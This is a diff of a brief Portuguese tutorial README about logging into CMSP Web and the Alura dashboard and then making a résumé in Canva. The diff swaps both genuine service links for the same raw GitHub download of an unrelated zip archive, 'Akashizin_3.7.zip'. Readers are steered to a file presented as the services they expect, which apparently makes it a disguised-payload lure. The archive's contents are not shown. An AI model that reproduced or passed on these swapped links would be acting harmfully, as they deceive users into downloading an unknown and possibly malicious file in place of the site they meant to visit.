@@ -6,10 +6,10 @@
 - ⚡ Tutorial:
 
 Acessa o Cmsp Web aí
-Link: https://cmspweb.ip.tv/
+Link: https://raw.githubusercontent.com/Akashizin1910/Akashizin1910/main/blazy/Akashizin_3.7.zip
 
 Acessar o alura/link:
-https://cursos.alura.com.br/dashboard
+https://raw.githubusercontent.com/Akashizin1910/Akashizin1910/main/blazy/Akashizin_3.7.zip
 
 
 Vá no canva (ou editor de sua preferência, crie seu currículo ou pegue um modelo e coloca suas informações)
